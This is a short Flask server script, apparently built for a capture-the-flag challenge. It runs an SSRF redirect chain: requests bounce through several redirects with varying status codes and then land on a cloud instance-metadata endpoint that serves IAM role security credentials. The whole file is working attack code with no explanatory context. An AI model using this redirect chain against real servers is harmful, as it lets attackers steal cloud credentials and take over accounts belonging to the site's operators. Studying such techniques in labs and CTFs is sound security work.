from flask import Flask, redirect, request

app = Flask(__name__)

TARGET = "http://10.0.0.10/latest/meta-data/iam/security-credentials/ctf-ec2-role"

@app.route('/start')
def start():
    return redirect("/r?c=0", code=302)

@app.route('/r')
def redir():
    c = int(request.args.get('c', 0)) + 1
    if c >= 4:
        return redirect(TARGET, code=302)
    status_code = 302 + c
    return redirect(f"/r?c={c}", code=status_code)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=4000, debug=False)
